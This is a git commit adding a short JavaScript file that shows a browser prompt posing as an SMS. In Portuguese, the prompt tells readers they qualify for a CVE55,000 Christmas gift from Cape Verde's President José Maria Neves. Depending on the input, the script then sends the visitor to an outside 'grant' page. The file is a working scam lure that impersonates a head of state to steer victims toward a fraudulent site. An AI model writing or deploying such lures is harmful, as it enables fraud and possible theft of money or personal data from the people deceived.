57c401f3342cc53bc1bae006c08c05d971f66dcd
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-14 04:33:19 -0800

    Create cape-verde-active.js

---
+++ cape-verde-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIR CVE55.000'
+password=prompt('SMS: Parabéns, você se qualifica para o Presidente José Maria Neves CVE55.000 PRESENTE DE CELEBRAÇÃO DE NATAL PARA CABO-VERDEOS. Por favor, pressione OK para retirar o subsídio em dinheiro de X-MAS   ','RETIR CVE55.000');
+if (password != 'RETIR CVE55.000') {
+location.href='https://get-offre.org/capeverde-grant.html';
+}
